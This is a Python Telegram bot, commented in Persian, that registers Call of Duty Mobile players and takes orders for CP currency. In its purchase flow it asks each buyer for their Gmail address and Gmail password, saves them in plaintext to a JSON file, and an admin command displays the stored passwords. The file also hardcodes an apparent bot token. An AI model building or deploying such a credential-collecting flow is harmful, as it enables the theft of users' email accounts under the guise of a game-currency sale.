import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import json

# تنظیم Token ربات
TOKEN = '7937158820:AAG_GEmXp5KeooUoIp3X_S9dIucEBXcoHT8'

# لیست آیدی‌های ادمین‌ها
ADMIN_USERS = [1891217517, 6442428304]

bot = telebot.TeleBot(TOKEN)

# فایل‌های ذخیره اطلاعات
USER_DATA_FILE = 'users_data.json'
CP_DATA_FILE = 'cp_data.json'

# دیکشنری برای پیگیری مراحل ثبت‌نام و خرید CP
user_states = {}
user_data = {}
purchase_states = {}
purchase_data = {}

# بارگذاری اطلاعات کاربران
def load_users():
    try:
        with open(USER_DATA_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return []

# ذخیره اطلاعات کاربران
def save_users(users):
    with open(USER_DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, ensure_ascii=False, indent=4)

# مقداردهی اولیه کاربران
users = load_users()

# بارگذاری اطلاعات خرید CP
def load_cp_data():
    try:
        with open(CP_DATA_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return []

# ذخیره اطلاعات خرید CP
def save_cp_data(data):
    with open(CP_DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

# مقداردهی اولیه خرید CP
cp_orders = load_cp_data()

# شروع ثبت‌نام
@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    if chat_id in user_states:
        bot.send_message(chat_id, "❌ شما در حال حاضر در فرآیند ثبت‌نام هستید.")
        return
    if any(user['chat_id'] == chat_id for user in users):
        bot.send_message(chat_id, "❌ شما قبلاً اطلاعات خود را ثبت کرده‌اید.")
        return
    user_states[chat_id] = "name"
    user_data[chat_id] = {}
    bot.send_message(chat_id, "سلام! لطفاً نام و نام خانوادگی خود را وارد کنید:")

@bot.message_handler(func=lambda message: message.chat.id in user_states)
def process_registration(message):
    chat_id = message.chat.id
    stage = user_states[chat_id]

    if stage == "name":
        user_data[chat_id]["name"] = message.text
        user_states[chat_id] = "cod_id"
        bot.send_message(chat_id, "لطفاً آیدی کالاف موبایل خود را وارد کنید:")
    elif stage == "cod_id":
        user_data[chat_id]["cod_id"] = message.text
        user_states[chat_id] = "cod_name"
        bot.send_message(chat_id, "نام اکانت کالاف موبایل خود را وارد کنید:")
    elif stage == "cod_name":
        user_data[chat_id]["cod_name"] = message.text
        user_states[chat_id] = "level"
        bot.send_message(chat_id, "لول اکانت کالاف خود را وارد کنید:")
    elif stage == "level":
        user_data[chat_id]["level"] = message.text
        users.append({
            'chat_id': chat_id,
            'name': user_data[chat_id]['name'],
            'cod_id': user_data[chat_id]['cod_id'],
            'cod_name': user_data[chat_id]['cod_name'],
            'level': user_data[chat_id]['level']
        })
        save_users(users)
        info_text = (f"✅ اطلاعات شما ثبت شد:\n"
                     f"👤 نام: {user_data[chat_id]['name']}\n"
                     f"🎮 آیدی کالاف: {user_data[chat_id]['cod_id']}\n"
                     f"🆔 نام اکانت: {user_data[chat_id]['cod_name']}\n"
                     f"⭐ لول: {user_data[chat_id]['level']}")
        bot.send_message(chat_id, info_text)
        for admin in ADMIN_USERS:
            bot.send_message(admin, "📥 ثبت‌نام جدید:\n" + info_text)
        del user_states[chat_id]
        del user_data[chat_id]

# خرید CP
@bot.message_handler(commands=['kharid_cp'])
def kharid_cp(message):
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("50 CP", callback_data="cp_50"),
        InlineKeyboardButton("70 CP", callback_data="cp_70"),
        InlineKeyboardButton("100 CP", callback_data="cp_100")
    )
    bot.send_message(message.chat.id, "✅ مقدار CP موردنظر را انتخاب کنید:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("cp_"))
def cp_selected(call):
    chat_id = call.message.chat.id
    purchase_states[chat_id] = "email"
    purchase_data[chat_id] = {"cp_amount": call.data.split("_")[1]}
    bot.send_message(chat_id, f"🔹 شما {purchase_data[chat_id]['cp_amount']} CP انتخاب کردید.\n\n✉️ لطفاً جیمیل خود را وارد کنید:")

@bot.message_handler(func=lambda message: message.chat.id in purchase_states)
def process_purchase(message):
    chat_id = message.chat.id
    stage = purchase_states[chat_id]

    if stage == "email":
        purchase_data[chat_id]["email"] = message.text
        purchase_states[chat_id] = "password"
        bot.send_message(chat_id, "🔑 لطفاً رمز جیمیل خود را وارد کنید:")
    elif stage == "password":
        purchase_data[chat_id]["password"] = message.text
        purchase_states[chat_id] = "payment"
        bot.send_message(chat_id, "💳 لطفاً مبلغ را به شماره کارت زیر واریز کنید:\n**1234-5678-9012-3456**")
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("بعدی ➡️", callback_data="next_step"))
        bot.send_message(chat_id, "پس از واریز، روی دکمه زیر کلیک کنید:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "next_step")
def finalize_purchase(call):
    chat_id = call.message.chat.id
    cp_orders.append(purchase_data[chat_id])
    save_cp_data(cp_orders)
    bot.send_message(chat_id, "✅ سفارش شما ثبت شد و تا ۲۴ ساعت آینده انجام می‌شود.")
    for admin in ADMIN_USERS:
        bot.send_message(admin, f"🛒 خرید جدید:\n💰 مقدار CP: {purchase_data[chat_id]['cp_amount']}\n✉️ جیمیل: {purchase_data[chat_id]['email']}")
    del purchase_states[chat_id]
    del purchase_data[chat_id]

# مشاهده خریدهای ثبت‌شده (فقط برای ادمین‌ها)
@bot.message_handler(commands=['moshahede_kharidar'])
def show_cp_orders(message):
    if message.chat.id not in ADMIN_USERS:
        bot.send_message(message.chat.id, "❌ شما ادمین نیستید و دسترسی به این دستور ندارید.")
        return

    cp_orders = load_cp_data()
    if not cp_orders:
        bot.send_message(message.chat.id, "❌ هیچ خریدی ثبت نشده است.")
        return

    for order in cp_orders:
        info_text = (f"👤 کاربر: {order.get('chat_id', 'نامشخص')}\n"
                     f"💰 مقدار CP: {order.get('cp_amount', 'نامشخص')}\n"
                     f"✉️ جیمیل: {order.get('email', 'نامشخص')}\n"
                     f"🔑 رمز: {order.get('password', 'نامشخص')}\n")
        bot.send_message(message.chat.id, info_text)

# اجرای ربات
bot.polling(none_stop=True)
